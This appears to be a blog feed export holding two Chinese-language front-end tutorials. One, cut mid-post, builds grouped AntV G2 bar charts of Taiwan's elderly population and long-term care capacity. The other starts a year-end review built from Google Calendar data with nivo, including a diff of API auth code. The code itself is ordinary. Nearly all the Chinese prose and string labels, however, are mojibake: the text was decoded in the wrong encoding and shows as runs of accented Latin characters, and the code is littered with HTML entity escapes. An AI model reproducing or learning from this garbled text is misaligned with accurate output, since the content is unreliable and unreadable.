æ¥è‘—è¨­å®š size ç‚º 50ï¼›åœ¨å¹¾ä½•åœ–å½¢ point ä¸­ï¼Œsize ä»£è¡¨åŸé»çš„åŠå¾‘ï¼Œå¦‚æœæ˜¯ interval å‰‡ä»£è¡¨æŸ±é«”å¯¬åº¦ï¼Œline å‰‡æ˜¯ç·šæ®µå¯¬åº¦ã€‚
é‚„æœ‰å€‹ç‰¹æ®Šçš„ shape() å‡½å¼ï¼Œä»–è®“æˆ‘å€‘å¯ä»¥æŒ‡å®šç‰¹å®šè³‡æ–™æ¬„ä½ï¼ˆåœ¨é€™é‚Šæˆ‘å€‘ç”¨ nameï¼‰ï¼Œå°‡å…¶è½‰æ›æˆä¸åŒçš„å‹æ…‹ï¼Œåƒæ˜¯é€™é‚Šæˆ‘å€‘å°±æŠŠå–®ç´”çš„ point mapping æˆåœ–ç‰‡ï¼Œè€Œé€™ä¸€åˆ‡åªè¦é€éä¸€å€‹ callback å‡½æ•¸ï¼Œå›å‚³å°æ‡‰çš„çµæœå³å¯ï¼
See the Pen 2017 å°ç£ç¸½é«”è€å¹´äººå£èˆ‡é•·ç…§æ©Ÿæ§‹ä¾›éœ€æ¯” - AntV - demo by Arvin (@arvin0731) on CodePen.


çŸ­çŸ­å¹¾è¡Œ code å°±ä½œå‡ºä¸€å€‹æ¯”ä¸€èˆ¬ Excel é‚„è¦ç‰¹åˆ¥ä¸€äº›çš„åœ–è¡¨ï¼ŒçœŸçš„è »æ–¹ä¾¿ä½¿ç”¨çš„å°å§ï¼
ä½†åªçœ‹å…¨å°ç£ç¸½é«”çš„è³‡æ–™å¥½åƒä¸å¤ªå¤ å•Šï¼Œèƒ½ä¸èƒ½çœ‹ä¸€ä¸‹å„ç¸£å¸‚çš„å‘¢ï¼Ÿç•¶ç„¶å¯ä»¥ã€‚
åªæ˜¯æ¯å€‹ç¸£å¸‚å¦‚æœéƒ½è¦æ”¾ä¸‰æ ¹é•·æ–¹é«”å¥½åƒå¤ªå¯†é›†äº†é»ï¼Œä¸æ˜¯å¾ˆé©åˆï¼Œæ‰€ä»¥å¦‚åŒæœ€å‰é¢çš„æˆå“åœ–ï¼Œå°‡è³‡æ–™åŒ—ã€ä¸­ã€å—ã€æ±èˆ‡å¤–å³¶äº”å€‹å€å¡Šï¼Œé€™æ¨£åœ–è¡¨æœƒæ¯”è¼ƒæ¸…æ™°ä¸€é»ã€‚
const data = [ &#123; name: &#x27;å¯ä¾›é€²ä½äººæ•¸&#x27;,    &#x27;åŒ—éƒ¨&#x27;: 25499,    &#x27;ä¸­éƒ¨&#x27;: 11027,    &#x27;å—éƒ¨&#x27;: 18684,    &#x27;æ±éƒ¨&#x27;: 1609,    &#x27;å¤–å³¶&#x27;: 328 &#125;,  &#123; name: &#x27;é•·ç…§ã€é¤Šè­·äººå“¡&#x27;,    &#x27;åŒ—éƒ¨&#x27;: 8994,    &#x27;ä¸­éƒ¨&#x27;: 3518,    &#x27;å—éƒ¨&#x27;: 5997,    &#x27;æ±éƒ¨&#x27;: 482,    &#x27;å¤–å³¶&#x27;: 73 &#125;,  &#123; name: &#x27;è€å¹´äººå£æ•¸(85~100+)&#x27;,    &#x27;åŒ—éƒ¨&#x27;: 162443,    &#x27;ä¸­éƒ¨&#x27;: 92071,    &#x27;å—éƒ¨&#x27;: 101846,    &#x27;æ±éƒ¨&#x27;: 10197,    &#x27;å¤–å³¶&#x27;: 2200 &#125; ];

DataSetè¦æƒ³åœ¨åŒä¸€åœ–è¡¨ä¸­å‘ˆç¾å¤šçµ„é•·æ¢åœ–ï¼Œæˆ‘å€‘éœ€å¼•é€² G2 ä¸­ DataSet çš„é€™å€‹æ¦‚å¿µã€‚
å®˜ç¶²ä»‹ç´¹
é€™å¼µåœ–çœ‹ä¼¼è¤‡é›œï¼Œä½†å…¶å¯¦å¾ˆæ¸…æ¥šçš„ä»‹ç´¹äº† DataSet åœ¨ä½¿ç”¨ G2 è£½åœ–çš„éç¨‹ä¸­æ‰€æ‰®æ¼”çš„è§’è‰²ï¼šæ“ä½œè³‡æ–™ã€‚
è³‡æ–™å¯ä»¥ç¶“ç”± Connector å‚³å…¥ DataSet ä¸­ï¼Œæ¥è‘—åˆ©ç”¨ Transforms é‡å°æ•¸æ“šåšè™•ç†ï¼ˆæ’åºã€çµ±è¨ˆã€è³‡æ–™è£œé½Šï¼‰ï¼Œæœ€å¾Œæ¸²æŸ“åˆ° DataView ä¸­ã€‚
çªç„¶çœ‹åˆ°ä¸€å †åè©æ„Ÿè¦ºæœ‰é»åš‡äººï¼Ÿåˆ¥æ“”å¿ƒï¼Œå¾…æœƒçš„ç¯„ä¾‹æœƒæ…¢æ…¢è¬›è§£ï¼Œåªè¦å…ˆæŠŠ DataSet æƒ³æˆæ˜¯å­˜æ”¾è³‡æ–™çš„è³‡æ–™é›†ï¼Œè€Œ DataView å°±æ˜¯æˆ‘å€‘è¦ç¹ªè£½å‡ºä¾†çš„è³‡æ–™è¦–åœ–ã€‚
å¦å¤–ï¼Œä¸€ä»½ DataSet å¯ä»¥é€£æ¥å¤šå€‹ DataViewï¼Œä¸¦é€éæ›´å‹•å…¶ä¸­çš„å…±ç”¨ State ä¾†é€²è¡Œé€£å‹•è®Šæ›´ï¼Œåœ¨æˆ‘å€‘çš„ç¯„ä¾‹ä¸­æ²’æœ‰ä½¿ç”¨åˆ°ï¼Œä½†å¯ä»¥åƒè€ƒå®˜ç¶²çš„æ¸…æ¥šç¯„ä¾‹

å›åˆ°æˆ‘å€‘çš„ç¯„ä¾‹ä¾†è·Ÿå‰›å‰›çš„ç¯„ä¾‹ä¸åŒï¼Œæˆ‘å€‘åœ¨é€²è¡Œè³‡æ–™ç¶å®šå‰ï¼ˆchart.source(data)ï¼‰ï¼Œéœ€è¦å…ˆå°æ•¸æ“šåšä¸€äº›æ“ä½œï¼Œæ‰€ä»¥è¦åˆ©ç”¨ DataSet èˆ‡ transform å…©å€‹ APIï¼š
const ds = new DataSet();const dv = ds.createView().source(data);dv.transform(&#123;  type: &#x27;fold&#x27;,  fields: [ &#x27;åŒ—éƒ¨&#x27;, &#x27;ä¸­éƒ¨&#x27;, &#x27;å—éƒ¨&#x27;, &#x27;æ±éƒ¨&#x27;, &#x27;å¤–å³¶&#x27;], // å±•é–‹è³‡æ–™  key: &#x27;å€åŸŸ&#x27;, // key, è¨­ç½®æ–°çš„ key/value å€¼ï¼Œä¾†å°æ‡‰æ–°æ•¸æ“šçš„å«ç¾©ã€‚  value: &#x27;å€åŸŸäººæ•¸&#x27;, // value  retains: [ &#x27;name&#x27; ] // æƒ³è¦ä¿ç•™åœ¨ transform å¾Œçš„è³‡æ–™æ¬„ä½&#125;);chart.source(dv);

é€é new DataSet() èˆ‡ createView() å‰µå»ºå‡ºä¸€å€‹æ“æœ‰ è³‡æ–™é›† &lt;-&gt; è³‡æ–™ç‹€æ…‹é€£æ¥ &lt;-&gt; è³‡æ–™è¦–åœ– é—œè¯æ€§çš„ç‰©ä»¶ dvï¼Œæ¥è‘—åˆ©ç”¨ transform() å‡½æ•¸é‡å°è³‡æ–™é€²è¡Œè™•ç†ã€‚
æˆ‘å€‘çš„è³‡æ–™æ˜¯æ ¹æ“š å¯ä¾›é€²ä½äººæ•¸&#39;ã€é•·ç…§ã€é¤Šè­·äººå“¡ èˆ‡ è€å¹´äººå£æ•¸ä¾†åˆ†é¡ï¼Œä½†æˆ‘å€‘å¯¦éš›ä¸Šå¸Œæœ›çš„æ˜¯èƒ½å¤ å…ˆä¾ç…§å€åŸŸåŠƒåˆ†ï¼Œåœ¨æ¯å€‹å€åŸŸä¸­å†åˆ†åˆ¥ç”¨é€™ä¸‰ç¨®é¡åˆ¥ä¾†æ¯”è¼ƒè³‡æ–™ã€‚
å› æ­¤åœ¨å‚³å…¥ transform çš„ option ä¸­ï¼Œæˆ‘å€‘é¸å®š type ç‚º foldï¼Œå…¶æ„ç¾©ç‚ºï¼šä»¥æŒ‡å®šå­—æ®µé›†ä½œç‚º Keyï¼Œå±•é–‹æ•¸æ“šã€‚ä¸¦ä¸”è¨­ç½®æ–°çš„ key&#x2F;value å€¼ï¼Œä¾†å°æ‡‰æ–°æ•¸æ“šçš„å«ç¾©ã€‚
ç›´æ¥æ‹¿æˆ‘å€‘çš„è³‡æ–™ä¾†ä½œç‚ºä¾‹å­ï¼Œæ¯”è¼ƒä¸€ä¸‹å‰å¾Œçµæœå°±æœƒå¾ˆæ¸…æ¥šäº†ï¼š
// åŸå§‹è³‡æ–™const data = [&#123;  name: &#x27;å¯ä¾›é€²ä½äººæ•¸&#x27;, &#x27;åŒ—éƒ¨&#x27;: 25499,&#x27;ä¸­éƒ¨&#x27;: 11027,&#x27;å—éƒ¨&#x27;: 18684,&#x27;æ±éƒ¨&#x27;: 1609,&#x27;å¤–å³¶&#x27;: 328&#125;, &#123;  name: &#x27;é•·ç…§ã€é¤Šè­·äººå“¡&#x27;, &#x27;åŒ—éƒ¨&#x27;: 8994, &#x27;ä¸­éƒ¨&#x27;: 3518, &#x27;å—éƒ¨&#x27;: 5997, &#x27;æ±éƒ¨&#x27;: 482, &#x27;å¤–å³¶&#x27;: 73&#125;, ...];// ç¶“é transform å¾Œconst dataBeenTransformed = [&#123;  key: &#x27;åŒ—éƒ¨&#x27;, value: 25499, name: &#x27;å¯ä¾›é€²ä½äººæ•¸&#x27;,&#125;, &#123;  key: &#x27;åŒ—éƒ¨&#x27;, value: 8994, name: &#x27;é•·ç…§ã€é¤Šè­·äººå“¡&#x27;,&#125;, &#123;  key: &#x27;ä¸­éƒ¨&#x27;, value: 11027, name: &#x27;å¯ä¾›é€²ä½äººæ•¸&#x27;,&#125;, &#123;  key: &#x27;ä¸­éƒ¨&#x27;, value: 3518, name: &#x27;é•·ç…§ã€é¤Šè­·äººå“¡&#x27;,&#125; ...];// åŸºæœ¬ä¸Šï¼Œtransform å¾Œï¼ŒåŸæœ‰çš„è³‡æ–™æ¬„ä½æœƒä¸è¦‹ï¼Œé€™é‚Šçš„ `name` é‚„ä¿ç•™æ˜¯å› ç‚ºæˆ‘æœ‰åŠ å…¥ `retains: [ &#x27;name&#x27; ]` é€™å€‹é¸é …ã€‚

å¦‚æ­¤ä¸€ä¾†ï¼Œæˆ‘å€‘åœ¨ç¹ªè£½åœ–è¡¨çš„æ™‚å€™ï¼Œä»–å°±æœƒä¾ç…§ç›®å‰çš„ Key, å°‡ç›¸åŒçš„ Key æ‰€å°æ‡‰çš„å€¼ Group åœ¨ä¸€èµ·ï¼Œè®“åŒ—éƒ¨é€™å€‹ Key å°æ‡‰çš„ä¸‰å€‹æ¬„ä½æ•¸å€¼ï¼ˆå¯ä¾›é€²ä½äººæ•¸ã€é•·ç…§äººå“¡æ•¸ã€è€å¹´äººå£æ•¸ï¼‰ä¸€èµ·åœ¨åŒå€‹åˆ†é¡ï¼ˆåŒ—éƒ¨ï¼‰ä¸­é¡¯ç¤ºã€‚
ä¸éï¼Œé‚„æ²’æœ‰çµæŸã€‚
å°‡è³‡æ–™åˆ†çµ„å¾Œï¼Œä¾ç…§å…ˆå‰çš„ç¹ªè£½æ–¹å¼ï¼Œæœƒç•«å‡ºä¸‹é¢é€™æ¨£çš„çµæœï¼š
chart.interval().position(&#x27;å€åŸŸ*å€åŸŸäººæ•¸&#x27;).color(&#x27;name&#x27;);



é›–ç„¶åˆ†çµ„äº†ï¼Œä½†è³‡æ–™é‡ç–Šåœ¨ä¸€èµ·äº†â€¦å›§
é€™æ˜¯å› ç‚ºæ¯å€‹åˆ†çµ„ä¸­çš„æ¯å€‹æ•¸æ“šéƒ½å¥—ç”¨åˆ°äº†åŒæ¨£çš„ position è¨­å®šï¼ˆå€åŸŸ*å€åŸŸäººæ•¸ï¼‰ï¼Œæˆ‘å€‘å¿…é ˆè¦èª¿æ•´ä¸€ä¸‹ï¼
é€é adjust() å‡½æ•¸å¯ä»¥æ–¹ä¾¿åšåˆ°ï¼š
.adjust([&#123;  type: &#x27;dodge&#x27;,  marginRatio: 1 / 5&#125;])

è¨­å®š type ç‚º dodgeï¼Œä»£è¡¨æˆ‘å€‘è¦èª¿æ•´çš„æ˜¯åˆ†çµ„æ•¸æ“šï¼Œç„¶å¾Œçµ¦äºˆ margin æ¯”ä¾‹ç‚º 1&#x2F;5ã€‚
See the Pen 2017 å°ç£è€å¹´äººå£èˆ‡é•·ç…§æ©Ÿæ§‹ä¾›éœ€æ¯” - AntV - demo1 by Arvin (@arvin0731) on CodePen.


çœ‹èµ·ä¾†å°±æ­£å¸¸å¤šäº†ï¼
é—œæ–¼ transform çš„é‹ç”¨ï¼Œå¯ä»¥åƒè€ƒå®˜æ–¹è©³è§£ - Transformé—œæ–¼ adjust çš„é‹ç”¨ï¼Œç›®å‰æ”¯æ´å››ç¨® typeï¼šstack, dodge, jitter, symmetricã€‚
ç¥å¥‡çš„æ˜¯ï¼Œé€™äº›ä¸åŒé¡å‹çš„å·®ç•°ï¼Œåœ¨æ“æœ‰è±å¯Œæ–‡æª”çš„å®˜æ–¹ç¶²ç«™ç«Ÿç„¶æ‰¾ä¸åˆ°ä»‹ç´¹ï¼Œæ‰€ä»¥æˆ‘å…¶å¯¦ä¹Ÿä¸å¤ªæ‡‚ã€‚é‡é»æ˜¯ï¼Œä¸åŒçš„è³‡æ–™å‹æ…‹æœƒæœ‰å„è‡ªé©åˆçš„ typeï¼Œå¤§å®¶åœ¨è£½ä½œæ™‚è¦è¨˜å¾—éƒ½å˜—è©¦çœ‹çœ‹æ•ˆæœã€‚
çœ‹èµ·ä¾†è »å®Œæ•´çš„äº†ï¼Œä½†åœ–è¡¨æ²’è¾¦æ³•å‹•æ…‹è®ŠåŒ–æ€éº¼å¯ä»¥ï¼æ²’éŒ¯ï¼Œæˆ‘ä¹Ÿè¦ºå¾—ä¸å¯ä»¥ã€‚
é‚„å¥½ AntV G2 è®“æˆ‘å€‘è¼•é¬†åˆ©ç”¨ chart.changeData() å°±èƒ½åŒæ™‚æ›´æ–° DataSet èˆ‡ DataViewã€‚æ›´æ£’çš„æ˜¯ï¼Œé™¤äº†æä¾› RWD è¨­è¨ˆå¤–ï¼Œè³‡æ–™è½‰æ›éç¨‹ä¸­çš„å‹•ç•«ä»–ä¹Ÿå¹«ä½ ç…§é¡§å¥½å¥½çš„ã€‚
é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘å€‘ä¹Ÿèƒ½å¤ ç›´æ¥æ“ä½œåŸæœ‰çš„ DataSetï¼Œåƒé–‹é ­çš„ç¯„ä¾‹ä¸€æ¨£ï¼Œé»é¸ button æ™‚ï¼Œæˆ‘å€‘é€é chart.filter ä¾†éæ¿¾åŸæœ‰è³‡æ–™ï¼Œä¸¦ä¸”åœ¨æœ€å¾Œå‘¼å« chart.repaint() é€²è¡Œ DataView çš„é‡ç¹ªï¼ˆä¸€å®šè¦é‡ç¹ªæ‰æœƒ trigger DataSet èˆ‡ DataView é–“çš„é€£å‹•ï¼‰ï¼š
const changeData = (status) =&gt; &#123;  chart.filter(&#x27;å€åŸŸ&#x27;, val =&gt; &#123;    if (status === &#x27;all&#x27;) &#123;      chart.scale(&#x27;å€åŸŸäººæ•¸&#x27;, &#123;        minLimit: 73      &#125;);      return true;    &#125;    chart.scale(&#x27;å€åŸŸäººæ•¸&#x27;, &#123;      minLimit: 400    &#125;);    return val !== &#x27;å¤–å³¶&#x27;;  &#125;);  chart.repaint();&#125;;

å¦‚æ­¤ä¸€ä¾†å°±èƒ½å®Œæˆé–‹é ­çš„ç¯„ä¾‹å•¦ï¼
See the Pen ç¸½é«”å°ç£è€å¹´äººå£èˆ‡é•·ç…§æ©Ÿæ§‹ä¾›éœ€æ¯” - AntV - demo by Arvin (@arvin0731) on CodePen.


çµè«–å¦‚åŒæˆ‘åœ¨å‰è¨€æåŠçš„å ±å°è€…å°ˆè¼¯ä¸­æ‰€å‘ˆç¾çš„ï¼Œå°ç£çš„é•·ç…§ç”¢æ¥­æ­£é¢è‡¨å¾ˆå¤§çš„å›°å¢ƒï¼Œåªè¦å®¶ä¸­æœ‰äººæœ‰é€™ç¨®éœ€æ±‚ï¼Œç›¸ä¿¡éƒ½èƒ½æœ‰å¾ˆæ·±çš„é«”æœƒã€‚å…ˆå‰ä¹Ÿæ›¾æœ‰å­¸é•·ä»¥é•·ç…§ç”¢æ¥­ç‚ºå‰µæ¥­é¡Œç›®ï¼Œå¯æƒœæœ€çµ‚é»¯ç„¶æ”¶å ´ï¼Œå¯è¦‹é€™å•é¡ŒçœŸçš„æœ‰å…¶åš´é‡èˆ‡å›°é›£æ€§å­˜åœ¨ã€‚
èº«ç‚ºå‰ç«¯é–‹ç™¼è€…ï¼Œæˆ–è¨±ç›®å‰èƒ½åšçš„æœ€å¤§è²¢ç»å°±æ˜¯ç›¡é‡è£½ä½œå‡ºè¨±å¤šä¸€ç›®äº†ç„¶çš„è³‡è¨Šåœ–è¡¨ã€ç¶²é å°ˆè¼¯ï¼Œè®“æ›´å¤šçš„äººçŸ¥é“å•é¡Œçš„åš´é‡æ€§ï¼Œé€é AntV G2 é€™æ¨£çš„å·¥å…·ï¼Œè£½ä½œäº’å‹•å¼åœ–è¡¨çœŸçš„æ˜¯è¶Šä¾†è¶Šæ–¹ä¾¿èˆ‡å®¹æ˜“ï¼Œå¸Œæœ›å¤§å®¶èƒ½å¤šåŠ è²¢ç»ï¼Œè®“å°ç£ç¤¾æœƒå¾€æ›´å¥½çš„æ–¹å‘èµ°å»ï¼è€Œå°é­¯æˆ‘èƒ½åŠ›ä¸è¶³åˆ†èº«ä¹è¡“â€¦å…ˆä¸‹å°ä¸€é èº¬â€¦


è³‡æ–™ä¾†æº
AntV
G2
å…§æ”¿éƒ¨æˆ¶æ”¿å¸äººå£è³‡æ–™åº«
è¡Œæ”¿é™¢æ€§åˆ¥å¹³ç­‰çµ±è¨ˆè³‡æ–™åº«
è¡›ç¦éƒ¨çµ±è¨ˆè™•-é•·æœŸç…§é¡§çµ±è¨ˆ
é•·ç…§æ©Ÿæ§‹è£¡çš„å¤§è±¡â€”â€”10è¬è€äººè¢«ç…§é¡§çš„çœŸç›¸
Icon made by Freepik from www.flaticon.com

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>javascript</tag>
        <tag>data visualization</tag>
        <tag>AntV</tag>
        <tag>G2</tag>
        <tag>RWD</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ Google Calendar èˆ‡ nivo è£½ä½œè‡ªå·±çš„å¹´çµ‚æª¢è¨å ±å‘Š</title>
    <url>/2018/12/15/dataviz-yearendreview/</url>
    <content><![CDATA[å‰è¨€å¾ 2017 å¹´é–‹å§‹ï¼Œæˆ‘æ¯å¤©éƒ½æœƒç”¨ Google Calendar ç´€éŒ„ç”Ÿæ´»ï¼Œä¹Ÿåœ¨å¹´åº•çš„æ™‚å€™åˆ©ç”¨ D3.js èˆ‡ Google api å°‡ç´€éŒ„çš„è³‡æ–™è¦–è¦ºåŒ–å‡ºä¾†åšå€‹å¹´çµ‚å›é¡§ã€‚ï¼ˆæ²’çœ‹éçš„è®€è€…å¯ä»¥å¾€é€™è£¡èµ°ï¼šä¸€èµ·ç”¨ Google Calendar èˆ‡ D3.js é€²è¡Œå¹´çµ‚å›é¡§å§ï¼ï¼‰
2018 ç•¶ç„¶ä¹Ÿä¸ä¾‹å¤–ï¼Œæˆ‘ä¾ç„¶æŒçºŒè¨˜éŒ„æ¯å¤©çš„æ—¥å¸¸ï¼Œé€éæ¯é€±å›é¡§è‡ªå·±çš„æ™‚é–“èŠ±è²»ä¾†èª¿æ•´ç›®æ¨™èˆ‡å¿ƒç†ç‹€æ…‹ã€‚
è€Œæ—¢ç„¶æˆ‘æœ‰äº†å…©å¹´çš„è³‡æ–™ï¼Œä¸æ‹¿ä¾†æ¯”è¼ƒçœ‹çœ‹å°±å¤ªå¯æƒœäº†ï¼Œå› æ­¤æ±ºå®šåœ¨æˆ‘ä»Šå¹´çš„æœ€å¾Œä¸€ç¯‡æ–‡ç« ä¸­ï¼Œå°‡ 2017 å¹´èˆ‡ 2018 å¹´çš„è³‡æ–™åšå€‹è¦–è¦ºåŒ–çš„æ¯”è¼ƒï¼Œçœ‹çœ‹æˆ‘åœ¨å·¥ä½œã€ç”Ÿæ´»ã€å¨›æ¨‚ä»¥åŠè‡ªæˆ‘é€²ä¿®ç­‰ä¸Šé¢çš„æ™‚é–“èª¿é…æ˜¯å¦æœ‰ç…§è‘—æˆ‘å»å¹´æ‰€å¸Œæœ›çš„æ­¥èª¿é€²è¡Œã€‚åœ¨ä¸€å¹´çš„å°¾è²ï¼Œå¥½å¥½é¢å°è‡ªå·±ï¼
ä¸€æ¨£å…ˆé™„ä¸Šæˆæœèˆ‡ demo linkï¼š

å·¥å…·å·¥å…·çš„ä½¿ç”¨ä¸Šï¼Œé€™æ¬¡ä¸¦æ²’æœ‰ä½¿ç”¨ D3.jsï¼Œç•¢ç«Ÿä»¥éœ€æ±‚ä¾†èªªï¼ŒD3.js å¤ªå¤§æå°ç”¨äº†ï¼ŒåŠ ä¸Šæˆ‘å‰é™£å­ç™¼ç¾ä¸€å€‹åŸºæ–¼ D3.js èˆ‡ React çš„è¦–è¦ºåŒ– library - nivoï¼Œçœ‹èµ·ä¾†éå¸¸ä¸éŒ¯ï¼Œæ‰€ä»¥é€™æ¬¡å°±æ‹¿é€™å¥—ä¾†è©¦è©¦çœ‹ï¼Œé€éé€™å¥—å·¥å…·ï¼Œæ•´å€‹ä½œå“å¤§æ¦‚ä¸ç”¨èŠ±è²»ä¸€å°æ™‚å°±å¯ä»¥å®Œæˆäº†ï¼Œå¤§å¤šçš„æ™‚é–“éƒ½æ˜¯åœ¨è™•ç†è³‡æ–™æ ¼å¼ä¸Šã€‚
è€ŒæŠ“å– Google Calendar è³‡æ–™çš„éƒ¨åˆ†ï¼Œä¸€æ¨£ä½¿ç”¨ Google çš„ apiï¼Œåªä¸éä¸€å¹´éå»ï¼ŒGoogle api ä¹Ÿæ˜¯æœ‰æ‰€æ›´æ–°ï¼Œä¸éå•é¡Œä¸å¤§ï¼Œç¨å¾®ä¿®æ”¹ä¸€äº›å°åœ°æ–¹å³å¯ï¼Œç¨å¾Œæœƒå¸¶åˆ°ã€‚
è¦–è¦ºåŒ–çš„ç¬¬ä¸€æ­¥ï¼Œå–å¾—è³‡æ–™åœ¨ä¸€èµ·ç”¨ Google Calendar èˆ‡ D3.js é€²è¡Œå¹´çµ‚å›é¡§å§ï¼ä¸­æˆ‘æœ‰æåˆ°éï¼Œé›–ç„¶ Google æœ‰æä¾›ä¸€å€‹ Google Takeout çš„åŠŸèƒ½ï¼Œä½ ä¹Ÿèƒ½ç›´æ¥åŒ¯å‡ºæ—¥æ›†ï¼Œä½†æ˜¯ä¸‹è¼‰åˆ°çš„è³‡æ–™å…¶æ ¼å¼éƒ½æ˜¯ iCalendarï¼Œé™¤éä½ åœ¨æ¯å€‹ç´€éŒ„çš„é …ç›®ä¸Šéƒ½æœ‰å¾ˆè©³ç´°çš„ç´€éŒ„å…§å®¹ï¼Œæ‰æœ‰è¾¦æ³•å»å°‡æ¯ä¸€é … task éƒ½é€²è¡Œåˆ†é¡ï¼Œåƒæˆ‘åªç”¨é¡è‰²ä¾†å€åˆ†çš„å°±æ²’è¾¦æ³•ã€‚

æ‰€ä»¥é‚„æ˜¯å¾—é  Google æä¾›çš„ Calendar API ä¾†å–å¾—è³‡æ–™ã€‚
è€Œ Google Calendar API çš„ä½¿ç”¨æ–¹å¼å¾ˆç°¡å–®ï¼Œåªè¦ç…§è‘—èªªæ˜æ‹¿åˆ°æ†‘è­‰å¾Œï¼Œå°±å¯ä»¥å¾ä»–å€‘æä¾›çš„ç¯„ä¾‹ ä¾†ä¿®æ”¹å¯¦ä½œã€‚
åŸºæœ¬ä¸Šè·Ÿæˆ‘å»å¹´å¯«çš„å·®ä¸å¤šï¼Œä¸»è¦æ˜¯åœ¨ auth çš„å¥—ä»¶ï¼ˆæ‹¿ cretential çš„æ–¹å¼ï¼‰ä»¥åŠ api å›å‚³çš„ schema æœ‰æ‰€è®Šå‹•ï¼š
- var googleAuth = require(&#x27;google-auth-library&#x27;);+ const &#123; google &#125; = require(&#x27;googleapis&#x27;);// If modifying these scopes, delete token.json.// The file token.json stores the user&#x27;s access and refresh tokens, and is// created automatically when the authorization flow completes for the first// time.var SCOPES = [&#x27;https://www.googleapis.com/auth/calendar.readonly&#x27;];- var TOKEN_DIR = (process.env.HOME || process.env.HOMEPATH ||-  process.env.USERPROFILE) + &#x27;/.credentials/&#x27;;- var TOKEN_PATH = TOKEN_DIR + &#x27;calendar-nodejs-quickstart.json&#x27;;+ const TOKEN_PATH = &#x27;token.json&#x27;;

function listEvents(auth, pageToken) &#123;- var calendar = google.calendar(&#x27;v3&#x27;);+ const calendar = google.calendar(&#123;version: &#x27;v3&#x27;, auth&#125;);const queryOptions = &#123;  auth: auth,  calendarId: &#x27;primary&#x27;,  timeMax: (new Date()).toISOString(),  singleEvents: true,  orderBy: &#x27;startTime&#x27;&#125;;if (pageToken) &#123;  queryOptions.pageToken = pageToken;&#125;calendar.events.list(queryOptions, function (err, response) &#123;if (err) &#123;  console.log(&#x27;The API returned an error: &#x27; + err);  return;&#125;-var events = response.items;+const resData = response.data || &#123;&#125;;+const events = resData.items;if (events.length == 0) &#123;  console.log(&#x27;No upcoming events found.&#x27;);&#125; else &#123;  // ...&#125;// ...&#125;&#125;

å®Œæ•´çš„ç¨‹å¼ç¢¼æˆ‘ä¸€æ¨£æœ‰æ”¾åœ¨ gist ä¸Šï¼Œå¦‚æœä½ ä¹Ÿæƒ³è¦ç”¨ Google API ä¸‹è¼‰è‡ªå·±çš„ Calendarï¼ŒåŸºæœ¬ä¸Šé™¤äº† listEvents å‡½æ•¸å…§çš„éƒ¨åˆ†ä»¥å¤–ï¼Œéƒ½å¯ä»¥ç›´æ¥ç…§æŠ„ï¼ŒlistEvents å…§çš„ç¨‹å¼ç¢¼æ˜¯ API çš„ callbackï¼Œä¸»è¦æ˜¯è² è²¬å¾ŒçºŒè³‡æ–™çš„è™•ç†ï¼Œå°‡ä¹‹è½‰åŒ–æˆæˆ‘å€‘è¦–è¦ºåŒ–æ‰€éœ€è¦çš„æ ¼å¼ã€‚è€Œé—œæ–¼ Calendar api ç›¸é—œåƒæ•¸çš„ä»‹ç´¹ï¼Œå¯ä»¥åƒè€ƒå»å¹´çš„æ–‡ç« ã€‚
nivoæ¥ä¸‹ä¾†ä»‹ç´¹ä¸€ä¸‹ nivo é€™å¥—å·¥å…·ã€‚
å®ƒæ˜¯ RaphaÃ«l Benitte æ‰€è£½ä½œï¼ŒåŸºæ–¼ D3.js èˆ‡ React.js çš„è¦–è¦ºåŒ–å¥—ä»¶ã€‚

æ¯”èµ·å¸‚é¢ä¸Šå…¶ä»–å¥—ä»¶ï¼Œæˆ‘è‡ªå·±èªç‚º nivo çš„å„ªå‹¢æœ‰å¹¾é»ï¼š

å°æ–¼ Server-side render çš„æ”¯æ´åº¦å¾ˆé«˜ã€‚

ç”±æ–¼æ”¯æ´ React SSRï¼Œnivo æä¾›äº† api ä»‹é¢ï¼Œè®“ä½ èƒ½é€é http request ç”¢ç”Ÿåœ–è¡¨ - è©³æƒ…å¯çœ‹ nivo-apiã€‚

Mono repo çš„æ–¹å¼ç®¡ç† packagesï¼Œå¯ä»¥ä¾ç…§éœ€æ±‚ï¼Œåªå®‰è£ä½ éœ€è¦çš„åœ–è¡¨ packageã€‚

å®£å‘Šå¼çš„å¯«æ³•ï¼ŒåŠ ä¸Šä»–äº’å‹•å¼çš„æ–‡ä»¶ç¯„ä¾‹ï¼Œå¥—ç”¨ä»–çš„åœ–è¡¨å¹¾ä¹æ²’æœ‰å­¸ç¿’æ›²ç·šã€‚




éƒ¨åˆ†å…ƒä»¶æä¾› Canvas å¯¦ä½œçš„ç‰ˆæœ¬ï¼Œå¤§é‡æ•¸æ“šä¹Ÿä¸æ€•ï¼

å‹•ç•«éƒ¨åˆ†ä½¿ç”¨ react-motionï¼Œå¯«é react çš„äººæ‡‰è©²ä¸é™Œç”Ÿï¼Œreact-motion å¯èªªæ˜¯ react å‹•ç•«ç•Œçš„ç¿¹æ¥šå•Šï¼

æ¯å€‹å…ƒä»¶éƒ½æœ‰å°æ‡‰çš„ Storybook å¯ä»¥çœ‹ï¼Œéå¸¸çš„ developer-friendly!


ç•¶ç„¶ä¹Ÿæ˜¯æœ‰ç¼ºé»çš„ï¼š

ä¸æ˜¯æ¯å€‹å…ƒä»¶éƒ½æ”¯æ´å‹•ç•«ï¼Œé€™æ™‚å€™æœƒçŸ¥é“ D3.js çš„å¥½(?

åœ–è¡¨ç¨®é¡å›ºå®šï¼Œæ¯”è¼ƒé›£æœ‰å‰µæ„çš„ç™¼æ®ã€‚


åŸºæ–¼ä»¥ä¸Šçš„å„ªç¼ºé»ï¼Œä¸é›£çœ‹å‡ºï¼Œå¦‚æœæ˜¯å°æ–¼ä¸ç†Ÿæ‚‰ D3.js æˆ–æ˜¯æƒ³è¦å¿«é€Ÿç”¢å‡ºåœ–è¡¨ï¼Œä½†åˆæƒ³è¦æœ‰å‹•ç•«æ•ˆæœæˆ–æ˜¯äº’å‹•æ€§çš„äººä¾†èªªï¼Œç›´æ¥æ¡ç”¨ nivo é€™é¡çš„ library æœƒæ˜¯å¾ˆä¸éŒ¯çš„é¸æ“‡ï¼Œä¹Ÿæ˜¯æˆ‘é€™æ¬¡æ¡ç”¨çš„åŸå› ã€‚
